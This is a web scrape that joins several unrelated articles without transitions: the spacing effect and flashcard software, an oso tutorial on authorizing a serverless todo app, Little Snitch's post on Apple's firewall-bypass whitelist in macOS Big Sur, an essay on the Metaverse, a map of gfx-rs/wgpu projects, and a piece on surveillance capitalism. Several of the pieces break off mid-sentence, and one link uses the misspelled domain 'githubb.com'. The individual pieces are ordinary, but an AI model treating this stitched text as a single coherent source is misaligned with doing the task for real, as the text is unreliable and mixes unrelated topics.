<p>This means if you are a student and you have an exam coming up a month from now, you should start studying now rather than waiting until a single week is left. If, for example, you’re going to spend 50 hours studying, then spreading those hours over the whole month, ensuring that you get re-exposed to the material in sufficiently spaced intervals, would get you much better results than you would if you crammed those 50 hours in a single stress-filled and coffee-fueled week.&nbsp;</p>

<p>Of course, that’s easier said than done.&nbsp;</p>

<p><span>The spacing effect is one of the most important weapons a learner can have on his arsenal</span> but knowing about its amazing effects does not mean that we will necessarily apply it. After all, we all know not to eat too many processed foods do we not? Yet, that doesn’t seem to stop many of us.&nbsp;</p>

<p>Pulling an all-nighter to cram for an exam is like binging on a sugar-filled pastry when one is trying to lose weight, yet the fact it continues to be a staple learning strategy of many a student is a testament to how difficult it can be to embrace the lessons of the spacing effect.&nbsp;</p>

<p>If only there were an app for that…</p>

<h2 id="this-app-will-turn-your-memory-into-a-superpower">This App Will Turn Your Memory Into A Superpower</h2>

<p>One hundred years ago Ebbinghaus didn’t have a computer, let alone a smartphone. If he’d had them they would have taken care of the task of spacing what he had to learn for him. Instead, he had to do all of that himself, though if we consider that he was the kind of guy that did not balk at the idea of spending hundreds of hours learning endless lists of nonsense, perhaps he wasn’t that fazed by it.</p>

<p>Thankfully, today we have tools that manage all of that for us.</p>

<p><span> And it all starts with a simple flashcard.&nbsp;</span></p>

<p>Everyone knows how a flashcard is supposed to work. You write something on the front, then something on the back, and then you’re supposed to recall what it was that you wrote on the back after reading what’s on the front.&nbsp;</p>

<p>Suppose that in the process of studying for a coming exam, you wrote many of these flashcards. You have a big pile of them sitting on your desk and within them are all the things you have to know if you want to ace that exam.&nbsp;</p>

<p>Because you know about the spacing effect, you know that cramming those flashcards is a bad strategy, but then how are you supposed to space them out? There are so many cards to keep track of…</p>

<p><span>What    if those flashcards existed on your computer instead?&nbsp;</span></p>

<p>If that were possible, then the computer could take care of the task of keeping track when you’re supposed to review your flashcards and you could focus solely on the things that matter, which, in this case, is answering your flashcards correctly and acing that exam.&nbsp;</p>

<p>Which is why spaced repetition software was invented: to take care of all the grunt work so you can easily add spaced repetition into your life.</p>

<p>At its core, all spaced repetition software does is keep track of when to present you with the material that you put in it. It’s called spaced repetition software because they use special algorithms to calculate the optimal interval between when you last reviewed the material and …</p></div></section></div></div>

<p>The main benefit of developing a serverless application is that managing
servers, balancing load, scaling up and down, and a hundred other things become
<em>someone else's problem</em> (🎉). However, securing your serverless
application with authorization remains decidedly your problem.</p>
<p>The cloud providers offer some helpful primitives like <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html">authentication
solutions</a>, access control for <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html">their own cloud
services</a>, and hooks for you to <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-use-lambda-authorizer.html">write your own custom
authorization code</a>, but much of the heavy lifting is left
up to you. In addition to writing tons (and <em>tons</em> and <strong><em>tons</em></strong>) of JSON,
you'll have to figure out the precise baton waves required to orchestrate your
authorization service / function / sidecar (/ clowncar) to ensure that
everything is wired up correctly (<code>"Resource": "*"</code> ought to do it) and that
it's <em>at least</em> as available as the service it's protecting.</p>
<p>Or you could skip all that and use <strong>oso</strong>, the open source policy engine for
authorization:</p>
<ul>
<li>
<p>Kiss gigantic JSON documents goodbye and write authorization logic in <a href="https://docs.osohq.com/using/polar-syntax.html">a
  declarative language</a> that mirrors the way you would explain
  the logic to a coworker.</p>
</li>
<li>
<p>Stop worrying about availability and orchestration by adding <a href="https://docs.osohq.com/using/libraries/index.html">the oso
  library</a> as a dependency and deploying it with the rest of
  your application code.</p>
</li>
<li>
<p>Render authorization decisions <em>quickly</em> with no time-wasting network hops or
  secondary service latency to contend with.</p>
</li>
</ul>
<p>In this post, we'll show you how oso makes it simple to add extensible,
fine-grained authorization to your serverless application.</p>
<h2>Starting out</h2>
<p>As our canvas, we're going to start with <a href="https://github.com/osohq/serverless-todo-app">a simple todo
app</a>. The app is written for Lambda's Node.js runtime, so
we'll be using <a href="https://docs.osohq.com/using/libraries/node/index.html">oso's Node.js library</a> to implement authorization.
However, if you wanted to add authorization to code written for a different
Lambda runtime, there are oso libraries for <a href="https://docs.osohq.com/using/libraries/python/index.html">Python</a>,
<a href="https://docs.osohq.com/using/libraries/ruby/index.html">Ruby</a>, <a href="https://docs.osohq.com/using/libraries/java/index.html">Java</a>, and <a href="https://docs.osohq.com/using/libraries/rust/index.html">Rust</a>, with more coming
soon.</p>
<p>The todo app consists of five Lambda functions (fronted by API Gateway)
covering the basic CRUD operations on top of a single DynamoDB table. To track
ownership, each todo has a <code>creator</code> field that contains a <code>User</code> populated
with a few fields from the Lambda event payload: <code>country</code>, <code>sourceIp</code>, and
<code>userAgent</code>.</p>
<p>Now that we have the lay of the land, let's fire up our serverless app (sans
authorization).</p>
<h2>No Authorization — No Code's evil twin</h2>
<p>If you don't want to get your hands dirty, the app is running (<strong>with
authorization in place</strong>) at <code>serverless-todo-app.oso.dev</code>. You may substitute
that address in every time you see <code>&lt;SERVICE_ENDPOINT&gt;</code> for the remainder of
the post.</p>
<p>If you're following along at home, you'll need a few things to get started:</p>
<ul>
<li>
<p>Clone <a href="https://github.com/osohq/serverless-todo-app">the repo</a> and <code>cd</code> into it.</p>
</li>
<li>
<p>Install dependencies with <code>npm install</code>.</p>
</li>
<li>
<p><a href="https://github.com/serverless/serverless/blob/d7b6fb748eba364aabeae3862f89b13262751c06/docs/providers/aws/guide/credentials.md">Set up AWS credentials for Serverless</a>.</p>
</li>
</ul>
<p>When you're all set up, <code>npm run serverless -- deploy</code> is the magic incantation
to coax some distant computers into action. After liftoff is achieved, you can
use cURL to interact with your extremely scalable todo app:</p>
<pre><code>$ curl https://&lt;SERVICE_ENDPOINT&gt;/todos
[]
$ curl https://&lt;SERVICE_ENDPOINT&gt;/todos -d '{"text":"my first todo!"}'
{"id":"0cf6cec0-247f-11eb-b64e-4df956b5b3e4","creator":{"country":"US","sourceIp":"1.2.3.4","userAgent":"curl/7.64.1"},"text":"my first todo!","checked":false,"createdAt":1605141365298,"updatedAt":1605141365298}
$ curl -XPUT https://&lt;SERVICE_ENDPOINT&gt;/todos/0cf6cec0-247f-11eb-b64e-4df956b5b3e4 -d '{"text":"my first updated todo!"}'
{"checked":false,"createdAt":1605141365298,"text":"my first updated todo!","creator":{"sourceIp":"1.2.3.4","country":"US","userAgent":"curl/7.64.1"},"id":"0cf6cec0-247f-11eb-b64e-4df956b5b3e4","updatedAt":1605141518919}
$ curl -XDELETE https://&lt;SERVICE_ENDPOINT&gt;/todos/0cf6cec0-247f-11eb-b64e-4df956b5b3e4
{"checked":false,"createdAt":1605141365298,"text":"my first updated todo!","creator":{"sourceIp":"1.2.3.4","country":"US","userAgent":"curl/7.64.1"},"id":"0cf6cec0-247f-11eb-b64e-4df956b5b3e4","updatedAt":1605141518919}
$ curl https://&lt;SERVICE_ENDPOINT&gt;/todos/0cf6cec0-247f-11eb-b64e-4df956b5b3e4
Not Found
</code></pre>

<p>Note that if you're hitting our hosted copy at <code>serverless-todo-app.oso.dev</code>,
requests to the list endpoint (<code>GET /todos</code>) will return a bunch of existing
todos instead of an empty list.</p>
<p>Our <s>battlestation</s> serverless todo app is now fully armed and
operational, but extremely vulnerable to <s>rebel attacks</s> unauthorized
shenanigans. Let's add some security!</p>
<h2>Adding authorization with oso</h2>
<p>First, add oso to our project: <code>npm install oso</code>.</p>
<p>Next, create an empty Polar file in the project root: <code>touch policy.polar</code>.
Polar is the declarative logic language used to write oso authorization rules,</p>
<p>The machinery of initializing oso and asking it to make an authorization
decision is identical across all five Lambdas, so we can wrap it in a function
in <code>src/helpers.js</code>:</p>
<pre><code>const { Oso } = require('oso');

const { User } = require('./User');

module.exports.may = async (user, action, resource) =&gt; {
  const oso = new Oso();
  oso.registerClass(Date);
  oso.registerClass(User);
  await oso.loadFile('policy.polar');
  return oso.isAllowed(user, action, resource);
};
</code></pre>

<p>We initialize oso, register the built-in <code>Date</code> object and our <code>User</code> class
(both of which we're going to use in our policy), load our Polar file, and then
ask oso if the loaded policy permits <code>user</code> to perform <code>action</code> on <code>resource</code>.</p>
<p>In each Lambda, we'll call our helper and return a 403 Forbidden if the user is
not authorized to perform the action on the resource in question:</p>
<pre><code>diff --git a/src/todos/update.js b/src/todos/update.js
index 86fff46..a5222a3 100644
--- a/src/todos/update.js
+++ b/src/todos/update.js
@@ -5,9 +5,10 @@ const { getTodo, updateTodo } = require('../db');
-const { error, success } = require('../helpers');
+const { error, may, success } = require('../helpers');

 module.exports.update = async (event, _context, cb) =&gt; {
   try {
-    const _user = User.fromEvent(event);
+    const user = User.fromEvent(event);
     const { id } = event.pathParameters;
     const todo = await getTodo(id);

+    const authorized = await may(user, 'update', todo);
+    if (!authorized) return error(cb, { statusCode: 403 });
</code></pre>

<p>Or if we just want to authorize an action generally (as opposed to authorizing
an action on specific resources):</p>
<pre><code>// src/todos/list.js

// ...

const authorized = await may(user, 'list');
if (!authorized) return error(cb, { statusCode: 403 });

// ...
</code></pre>

<p>Once we've added those two lines to all of our Lambdas, we're now enforcing
authorization!</p>
<p><a href="https://github.com/osohq/serverless-todo-app/compare/authorized~">Click here</a> to see a full diff of adding oso to the project.</p>
<p>If you redeploy the app at this point (<code>npm run serverless -- deploy</code>), every
request will 403 because <strong>oso is deny-by-default</strong>. We haven't added any rules
to our policy file yet, so in oso's view of the world no one is authorized to
do anything.</p>
<p>This is obviously a bit <em>too</em> secure, so let's sketch out our authorization
requirements and write some Polar code.</p>
<h2>Writing declarative authorization logic</h2>
<p>Because of its critical role in application security, authorization logic has a
higher bar for readability and auditability than regular old business logic.
Polar was designed with readability as a first-class feature.</p>
<p>We're going to create five authorization rules, one for each Lambda. First,
we'll write the rule in prose, and then we'll show <a href="https://github.com/osohq/serverless-todo-app/blob/authorized/policy.polar">the corresponding Polar
code</a>.</p>
<ul>
<li>Any user is allowed to list todos:</li>
</ul>
<pre><code>allow(_: User, "list", _);
</code></pre>

<ul>
<li>Any user is allowed to create a new todo:</li>
</ul>
<pre><code>allow(_: User, "create", _);
</code></pre>

<ul>
<li>A user is allowed to view a specific todo if they are in the same country as
  the todo's creator:</li>
</ul>
<pre><code>allow(user: User, "view", todo) if
    user.country = todo.creator.country;
</code></pre>

<ul>
<li>A user is allowed to update a todo if their IP address and user agent match
  those of the todo's creator:</li>
</ul>
<pre><code>allow(user: User, "update", todo) if
    user.sourceIp = todo.creator.sourceIp
    and user.userAgent = todo.creator.userAgent;
</code></pre>

<ul>
<li>A user is allowed to delete a todo if they're allowed to update it <strong>and</strong>
  the todo was created within the last 5 minutes:</li>
</ul>
<pre><code>allow(user: User, "delete", todo) if
    allow(user, "update", todo)
    and ((new Date().getTime() - todo.createdAt) / (60 * 1000)) &lt; 5;
</code></pre>

<p>These rules show off a few of oso's strengths. Implementing fine-grained
<a href="https://docs.osohq.com/using/examples/abac.html">attribute-based access control</a> (ABAC) is simple when we can write rules
directly over application data (in this case, our <code>User</code> class and the
structured todo data). The rules are also composable and flexible — instead of
duplicating logic in the delete rule, we simply asked if the user was allowed
to update the todo and then extended it with an additional time-based check.
And, finally, we did some math to determine if five minutes has elapsed since
the todo's creation. We could have written a function to calculate the same
thing in our Lambda code, but it's a calculation that's only relevant in an
authorization context. By writing it here, we maintain <a href="https://docs.osohq.com/more/design-principles.html#separation-of-concerns-but-not-data">the separation of
concerns between our authorization and business logic</a>.</p>
<p>Once we've added those rules to our policy file, we can redeploy and interact
with our newly secured app:</p>
<pre><code>$ curl --user-agent "007" https://&lt;SERVICE_ENDPOINT&gt;/todos -d '{"text":"Do something nice for Moneypenny"}'
{"id":"9d8b9b02-3175-4211-a8fb-8645d1f70a11","creator":{"country":"US","sourceIp":"67.244.40.223","userAgent":"007"},"text":"Do something nice for Moneypenny","checked":false,"createdAt":1605211750276,"updatedAt":1605211750276}
$ curl --user-agent "Goldfinger" -XPUT https://&lt;SERVICE_ENDPOINT&gt;/todos/9d8b9b02-3175-4211-a8fb-8645d1f70a11 -d '{"text":"Retire, you putz!"}'
Can't do that, boss
</code></pre>

<h2>Conclusion</h2>
<p>We used oso to quickly add fine-grained authorization to our serverless app. We
leveraged the app's existing data model to express our authorization logic in a
few concise stanzas instead of commingling it with business logic in a tangle
of nested <code>if</code> / <code>else</code> statements. And we did it all with <a href="https://github.com/osohq/serverless-todo-app/compare/authorized">a minimal
application footprint</a> and no external service dependencies.</p>
<p>A fun extension would be hooking up Cognito for richer user data than the
Lambda event …</p></div></div></div>

                <!--kg-card-begin: image--><figure><img src="https://blog.obdev.at/content/images/2020/11/hole-in-the-wall.png"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p><a href="https://apple.com/privacy">Apple on Privacy</a>:</p>
<blockquote>
<p>Privacy is a fundamental human right. At Apple, it’s also one of our core values. Your devices are important to so many parts of your life. <strong>What you share from those experiences, and who you share it with, should be up to you. We design Apple products to protect your privacy and give you control over your information.</strong> It’s not always easy. But that’s the kind of innovation we believe in.</p>
</blockquote>
<p>We could not agree more. That’s why we created Little Snitch in the first place, 18 years ago.</p>
<p>It is your right to know where your computer connects to. To whom it talks. It’s your right to see these connections. It’s your right to allow them. And it’s your right to deny them.</p>
<p>That’s our philosophy. You should always be able to see what’s going on and to make informed decisions.</p>
<p>When we first discovered that Apple’s new Network Extension Framework — that all third party firewalls are now required to use on macOS Big Sur<sup><a href="#fn1" id="fnref1">[1]</a></sup> — didn’t report network traffic during some large software update download, we reported this bug to Apple on July 1 (FB7839544), hoping it would be fixed in the final version of Big Sur.</p>
<p>But it came worse. Three months later we realized, that a number of other Apple services like App Store, Maps or FaceTime also showed this strange behavior of acting invisibly, bypassing the new filter API. So we reported our new findings again on October 1 (FB8762834).</p>
<p>As it turned out, this behavior is on purpose. There’s an <a href="https://www.obdev.at/support/littlesnitch/245914647368270">explicit whitelist</a> that allows certain macOS services to bypass any third party firewalls and to communicate on the Internet without being even noticed by the user. A hole in the wall.</p>
<p>It is understandable, that some network connections are essential for a secure and smooth system operation. It makes sense to <a href="https://blog.jacopo.io/en/post/apple-ocsp">check the validity of signing certificates</a> to effectively protect against malware attacks. It makes sense to download critical security updates in a timely fashion to prevent malware from exploiting vulnerabilities that have already been fixed. Blocking such connections would usually cause more harm than good.</p>
<p>But hiding these connections completely from the user makes no sense. It contradicts the idea of a transparent and trustworthy system and undermines the user’s trust in that system.</p>
<p>We’ve been facing similar challenges in Little Snitch as well. If we allow users to block each and every network connection, they might inadvertently render their computer unusable, causing DNS lookups to hang, preventing users from logging into their accounts and more.</p>
<p>How did we solve it? By being transparent and informative. By telling users about the possible consequences that the denial of certain connections might have, and in some cases recommending them not to do so. By providing default firewall rules to allow a few essential connections, but still letting users opt out. By developing the <a href="https://obdev.at/iap/">Internet Access Policy</a> that also gives third party developers the possibility to explain, which connections their apps are about to make, and whether it’s OK or not to deny them.</p>
<p>But the final decision whether to accept the possible consequences should always be left to the user, to you.</p>
<p>In the light of the recent public discussions that this topic has triggered we are extremely confident that Apple stands by their word to give users control over their information and will therefore eliminate this kind of whitelisting in a future macOS update.</p>
<p>Just yesterday Apple announced their willingness to address such privacy concerns by improving the way how online certificate checks are performed, and even <a href="https://support.apple.com/en-us/HT202491">adding the possibility to completely opt out of these security protections</a>.</p>
<p>Until then we won’t be restless either. We are already working on an alternative technique how to make even those currently hidden connections visible again in Little Snitch in one of our next updates. Looks very promising so far!</p>
<p>So stay tuned and protect your privacy. It’s yours, after all.</p>

</div></div><div data-block-type="2" id="block-29baffae350c11fb3cab"><div><p><strong><em>An Introduction…</em></strong></p><p>Technology frequently produces surprises that nobody predicts. However, the biggest developments are often anticipated decades in advance. In 1945 Vannevar Bush described what he-called the “<a href="https://en.wikipedia.org/wiki/Memex">Memex</a>”, a single device that would store all books, records and communications, and mechanically link them together by association. This concept was then used to formulate the idea of “hypertext” (a term coined two decades later), which in turn guided the development of the World Wide Web (developed another two decades later). The “Streaming Wars” have only just begun, yet the first streaming video took place more than 25 years ago. What’s more, many of the attributes of this so-called war have been hypothesized for decades, such as virtually infinite supplies of content, on-demand playback, interactivity, dynamic and personalized ads, and the value of converging content with distribution.</p><p>In this sense, the rough outlines of future solutions are often understood and, in a sense, agreed upon well in advance of the technical capacity to produce them. Still, it’s often impossible to predict how they’ll fall into place, which features matter more or less, what sort of governance models or competitive dynamics will drive them, or what new experiences will be produced. By the time Netflix launched its streaming service, much of Hollywood knew that the future of television was online (IP TV had been deployed in the late 1999s). The challenge was <a href="https://twitter.com/ballmatthew/status/1146081701535330305?s=20">timing</a> and <a href="https://redef.com/original/the-digital-future-of-tv-networks-the-original-series-crunch">how to package such a service</a> (it took another 10 years for Hollywood to accept all of their channels, genres and content needs to be collapsed into a single app/brand). The popularity of video game broadcasting and YouTubers still elude many in the media industry, as does the idea that the best way to monetize content might be to give it away for free and charge for optional $0.99 items of no consequential value. The acquisition of media conglomerate Time Warner by landline internet giant AOL was set in 2000 based on the idea media and tech/distribution needed to converge, but was unwound in 2009 after it failed to produce much benefit. Nine years later, it was then bought by mobile internet giant AT&amp;T under the same premise.</p><p>While many technologists imagined some sort of “personal computer”, its attributes and timing were so unpredictable that Microsoft dominated the PC era that began in the 1990s rather than the mainframe domineer IBM. And while Microsoft<a href="https://twitter.com/stevesi/status/1214924421476929536?s=20"> clearly foresaw mobile</a>, it misread the role of the operating system and too much of the hardware, hence the rise of iOS and Android globally (and Microsoft’s shift from the OS layer to the app/services one). In a similar sense, Steve Jobs’ priorities for computing were always “right”, they were just too early and focused on the wrong device. More broadly, the two most dominant cases of the early Internet were instant messaging and email, and yet the importance of social apps/networks was still unexpected until the late 2000s. And for that matter, all of the prerequisites for building Facebook existed pre-Y2K, but Facebook didn't come along until 2005 – and even then, it was an accident.</p><p>Since the late 1970s and early 1980s, many of those in the technology community have imagined a future state of, if not quasi-successor to, the Internet – called the “Metaverse”. And it would revolutionize not just the infrastructure layer of the digital world, but also much of the physical one, as well as all the services and platforms atop them, how they work, and what they sell. Although the full vision for the Metaverse remains hard to define, seemingly fantastical, and decades away, the pieces have started to feel very real. And as always with this sort of change, its arc is as long and unpredictable as its end state is lucrative.</p><p>To this end, the Metaverse has become the newest macro-goal for many of the world’s tech giants. As I outlined in<a href="https://redef.com/original/fortnite-is-the-future-but-probably-not-for-the-reasons-you-think"> February of 2019</a>, it is the express goal of Epic Games, maker of the <em>Unreal Engine</em> and <em>Fortnite</em>. It is also <a href="https://www.facebook.com/zuck/posts/10111311886191191">the driver</a> behind Facebook’s purchase of Oculus VR and its newly announced Horizon virtual world/meeting space, among<a href="https://www.theinformation.com/articles/to-control-its-destiny-facebook-bets-big-on-hardware"> many, many other projects</a>, such as AR glasses and brain-to-machine communications. The tens of billions that will be <a href="https://redef.com/original/how-cloud-gaming-will-and-wont-disrupt">spent on cloud gaming</a> over the next decade, too, is based on the belief that such technologies will underpin our online-offline future.</p><p>Ultimately, you’ll find many of the same items in the offices of Big Tech CEOs. However, the most well-worn is likely to be a copy of Neal Stephenson’s <em>Snow Crash</em>, which first described and essentially coined the terms “Metaverse” and “Avatar”. And there are many reasons why.</p><p><strong>CHAPTER 1: WHAT IS THE “METAVERSE”</strong></p><p>The most common conceptions of the Metaverse stem from science fiction. Here, the Metaverse is typically portrayed as a sort of digital “jacked-in” internet – a manifestation of actual reality, but one based in a virtual (often theme park-like) world, such those portrayed in <em>Ready Player One</em> and <em>The Matrix</em>. And while these sorts of experience are likely to be an <em>aspect</em> of the Metaverse, this conception is limited in the same way movies like <em>Tron </em>portrayed the Internet as a literal digital “information superhighway” of bits. </p><p>Just as it was hard to envision in 1982 what the Internet of 2020 would be — and harder still to communicate it to those who had never even “logged” onto it at that time — we don’t really know how to describe the Metaverse. However, we can identify core attributes.</p><p>The Metaverse, we think, will...</p><ol data-rte-list="default"><li><p><strong>Be persistent</strong> – which is to say, it never “resets” or “pauses” or “ends”, it just continues indefinitely</p></li><li><p><strong>Be synchronous and live </strong>– even though pre-scheduled and self-contained events will happen, just as they do in “real life”, the Metaverse will be a living experience that exists consistently for everyone and in real time</p></li><li><p><strong>Have no real cap to concurrent participations with an individual sense of “presence” </strong>– everyone can be a part of the Metaverse and participate in a specific event/place/activity together, at the same time and with individual agency</p></li><li><p><strong>Be a fully functioning economy </strong>– individuals and businesses will be able to create, own, invest, sell, and be rewarded for an incredibly wide range of “work” that produces “value” that is recognized by others</p></li><li><p><strong>Be an experience that spans </strong>both the digital and physical worlds, private and public networks/experiences, and open and closed platforms</p></li><li><p><strong>Offer unprecedented interoperability </strong>of data, digital items/assets, content, and so on across each of these experiences – your “Counter-Strike” gun skin, for example, could also be used to decorate a gun in <em>Fortnite</em>, or be gifted to a friend on/through Facebook. Similarly, a car designed for <em>Rocket League</em> (or even for Porsche’s website) could be brought over to work in <em>Roblox. </em>Today, the digital world basically acts as though it were a mall where though every store used its own currency, required proprietary ID cards, had proprietary units of measurement for things like shoes or calories, and different dress codes, etc.</p></li><li><p>Be populated by “content” and “experiences” <strong>created and operated by an incredibly wide range of contributors</strong>, some of whom are independent individuals, while others might be informally organized groups or commercially-focused enterprises</p></li></ol><p>There are a few other ideas that may be core to the Metaverse, but are not widely agreed upon. One of these concerns is whether participants will have a single consistent digital identity (or “avatar”) that they will use across all experiences. This would have practical value but is probably unlikely as each of the leaders in the “Metaverse era” will still want their own identity systems. Today, for example, there are a few dominant account systems – but none have exhaustive coverage of the web and they often stack atop one another with only limited data sharing/access (e.g. your iPhone is based around an iOS account, then you might log into an app using your Facebook ID, which itself is your Gmail account). </p><p>There is also disagreement on how much interoperability is required for the Metaverse to really be “the Metaverse”, rather than just an evolution of today’s Internet. Many also debate whether a true Metaverse can have a single operator (as is the case in <em>Ready Player One</em>). Some believe the definition (and success) of a Metaverse requires it to be a heavily decentralized platform built mostly upon community-based standards and protocols (like the open web) and an “open source” Metaverse OS or platform (this doesn’t mean there won’t be dominant closed platforms in the Metaverse).</p><p>Another idea relates to the fundamental communications architecture of the Metaverse. This is described in more detail later in the piece, but while today’s Internet is structured around individual servers “talking” to one another on an as-needed basis, some believe the Metaverse needs be “wired” and “operated” around persistent many-to-many connections.

<h2 id="nodes">Nodes</h2>

<p><a href="https://github.com/MaikKlein/ash/">ash</a> - Vulkan bindings we use in <em>gfx-rs</em>, external to us.</p>

<p><a href="https://github.com/gfx-rs/metal-rs">metal-rs</a> - Metal bindings crate we use in <em>gfx-rs</em>, also used outside.</p>

<p><a href="https://github.com/gfx-rs/d3d12-rs">d3d12-rs</a> - simple D3D12 convenience wrapper we use in <em>gfx-rs</em>.</p>

<p><a href="https://github.com/retep998/winapi-rs">winapi</a> - WinAPI bindings we use in <em>gfx-rs</em> for both DX11 and DX12 (where <em>d3d12-rs</em> has gaps), external to us.</p>

<p><a href="https://github.com/grovesNL/glow">glow</a> - OpenGL (including ES and WebGL) bindings we use in <em>gfx-rs</em>, also used outside.</p>

<p><a href="https://github.com/gfx-rs/gfx">gfx-rs</a> - our portable graphics API in Rust, tightly following Vulkan.</p>

<p><a href="https://github.com/gfx-rs/portability">gfx-portability</a> - a <a href="https://www.khronos.org/blog/fighting-fragmentation-vulkan-portability-extension-released-implementations-shipping">Vulkan Portability</a> API wrapper around <em>gfx-rs</em>. Can be used as a drop-in Vulkan driver on platforms without native Vulkan support.</p>

<p><a href="https://github.com/KhronosGroup/SPIRV-Cross">SPIRV-Cross</a> - shader translation library in C++, taking SPIR-V as an input.  It’s developed by a few Khronos members. We currently use it for generating platform-specific shaders in <em>gfx-rs</em>. We are phasing it away, replacing by <em>naga</em> gradually (the striped fill signifies deprecation in the diagram).</p>

<p><a href="https://github.com/gfx-rs/naga">naga</a> - our new shader translation library in Rust, it has a number of front-ends (SPIR-V, GLSL, and WGSL so far), various backends (SPIR-V, MSL, GLSL so far), and a solid intermediate representation (IR) in the middle. It’s a young project, and we are slowly rolling it out to replace the C++ blocks around the ecosystem, such as SPIRV-Cross and glsl-to-spirv/shaderc (used by many gfx/wgpu/Vulkan devs).</p>

<p><a href="https://github.com/gfx-rs/wgpu">wgpu</a> - our implementation of WebGPU API in Rust. It’s safe, portable, and fast (in this order).</p>
<ul>
  <li>Uses <em>gfx-rs</em> to reach the hardware.</li>
  <li>Uses <em>naga</em> to parse WGSL shaders, as well as introspect both SPIR-V and WGSL shaders. This allows us to validate the shaders, also to derive the implicit bind group layouts.</li>
  <li>able to record and replay <a href="http://kvark.github.io/wgpu/debug/test/ron/2020/07/18/wgpu-api-tracing.html">API traces</a> across platforms.</li>
</ul>

<p><a href="https://github.com/gfx-rs/wgpu-rs">wgpu-rs</a> - idiomatic Rust bindings to <em>wgpu</em>, meant for Rust end-users. Has many dependent <a href="https://github.com/gfx-rs/wgpu-rs/wiki/Applications-and-Libraries">applications and libraries</a>, including Nannou and Bevy.</p>
<ul>
  <li>Currently able to target <em>wgpu</em> as well as the WebGPU/WASM (experimental in browsers).</li>
  <li>Will be able to link to an implementation behind the portable <a href="https://github.com/webgpu-native/webgpu-headers">WebGPU C header</a>, such as <em>wgpu-native</em>.</li>
</ul>

<p><a href="https://githubb.com/gfx-rs/wgpu-native">wgpu-native</a> - a wrapper around <em>wgpu</em> that exposes a WebGPU C API conforming to the <a href="https://github.com/webgpu-native/webgpu-headers">shared header</a>. The plan is to have it accessible by non-Rust libraries, as a drop-in replacement for <a href="https://dawn.googlesource.com/dawn">Dawn</a>, also accessible via <a href="https://nodejs.org/api/n-api.html">NAPI</a>.</p>

<p><a href="https://github.com/denoland/deno">Deno</a> - JS/TS runtime in Rust. There is a mostly complete <a href="https://github.com/denoland/deno/pull/7977">PR #7977</a> delivering support for WebGPU via <em>wgpu</em>. It should allow native JS/TS applications (such as  <em>TensorFlow.js</em>) using WebGPU to run directly on top of <em>wgpu</em> in the future.</p>

<p><a href="https://github.com/servo/servo">Servo</a> - an experimental browser engine in Rust. It has WebGPU support via <em>wgpu</em>.</p>

<p><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Gecko">Gecko</a> - the browser engine powering Firefox, developed by Mozilla. It also implements WebGPU via <em>wgpu</em>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The concept of surveillance capitalism is an important one in helping us to better understand our relationship with big technology companies like Google and Facebook. But although its explanatory power has an allure for many people, it’s important to explore what surveillance capitalism is in more depth.</p><p>This is because the genealogy of the concept and the way in which different people have explained and defined it – most significantly Harvard Professor Shoshana Zuboff – has serious implications for how we understand ‘big tech’ and the problems it is causing. More importantly, it could also help us identify what we need to do to solve them.</p><h2>What is surveillance capitalism?</h2><p>Surveillance capitalism is an idea that has been developed to explain how technology companies such as Facebook, Google, and Amazon are able to successfully monetize the information and data they collect about us.</p><p>This is ‘surveillance’ insofar as the data that they collect lets them ‘watch’ users on their platforms. It allows them to build a picture of our preferences and our behaviours. The ability to build up this picture gives them a significant commercial advantage, and significant power within the digital ecosystem. It doesn’t allow them to sell products – it makes them a critical part of the infrastructure of the digital economy.</p><p>The means through which this surveillance can take place is constantly evolving. Think, for example of Amazon Alexa and Google Home. Such products allow big tech to gather data on our everyday lives even when we are away from our screens. This allows them to better understand these domains, and they will likely eventually find a way to exploit them commercially.</p><h2>When did surveillance capitalism begin?</h2><p>In historical terms, surveillance capitalism aligns with the growth of the internet. More specifically, however, it was the emergence of <a href="https://en.wikipedia.org/wiki/Web_2.0">Web 2.0</a>.</p><p>The dominance of platforms like Facebook and Google is an important characteristic of Web 2.0. Rather than enabling passive information consumption, Web 2.0 facilitates active engagement, whether that’s between people or between people and companies. Because activity is a key element of web 2.0, this means not only is more data produced, it’s also much richer as well. It is able to capture more complex relationships within a given network.</p><p>The story could be put like this: as the world became more digitized throughout the 2010s, with consumers both more comfortable with digital life and better digitally connected than ever before (think, for example, of the number of devices used in daily life), the huge amounts of data that such an environment produced became a useful commodity for the companies whose platforms were such an integral part of this digital ecosystem.</p><h3>Digital advertising</h3><p>It’s hard to separate surveillance capitalism from digital advertising. Facebook and Google, for example, are fundamentally advertising platforms. What makes them particularly effective is that they have huge amounts of data that makes them exceptionally good at targeting advertising and other types of messages to very specific groups of people.</p><p>Many people forget this but it’s important: these companies don’t sell to consumers, they sell to organizations that sell to consumers. This is where the idea that ‘if it’s free, you are the product’ comes from. Companies like Facebook and Google are selling access to users – you – to other businesses and organizations.</p><h2>Why are we talking about surveillance capitalism now?</h2><p>The business models of large technology platforms didn’t emerge in the last couple of years. They were in place more than a decade ago; they have simply evolved to become increasingly more powerful and pervasive. You might even say that there has been a lag between the <em>embrace</em> of digital technologies and the awareness that they might be problematic.</p><p>But where has this awareness come from? What’s changed? Well, there are a couple of important things throughout the last decade that have given a different complexion to the tech industry.</p><p>First, <a href="https://www.informationisbeautiful.net/visualizations/worlds-biggest-data-breaches-hacks/">high profile data leaks</a> have made people more aware of the ways in which their data is vulnerable online. This issue doesn’t strictly relate to the concept of surveillance capitalism but it has nevertheless been an important subplot in the narrative of digitization. It has encouraged many people to question the assumption that the digital revolution is unequivocally good.</p><p><strong>Read next: <a href="https://thecookiemag.com/what-is-the-techlash-really-and-is-it-actually-over/">What is the techlash?</a></strong></p><h3>The Cambridge Analytica scandal</h3><p>Second – and more significant – was the Cambridge Analytica scandal. Although Cambridge Analytica wasn’t <a href="https://www.theguardian.com/technology/2019/mar/17/the-cambridge-analytica-scandal-changed-the-world-but-it-didnt-change-facebook">really doing anything radically different from any other digital marketing company</a>, the fact that it appeared to be working with political actors that wanted to ‘manipulate’ citizens in some way added a new dimension to the public’s perspective on this actually rather mundane reality of the digital economy.</p><p>It’s in this context of confusion and cynicism about the way that actors are using platforms that the most popular account of surveillance capitalism was given by Shoshana Zuboff. Her book The Age of Surveillance Capitalism was published in 2019. Its success indicates that the has been looking for a way of 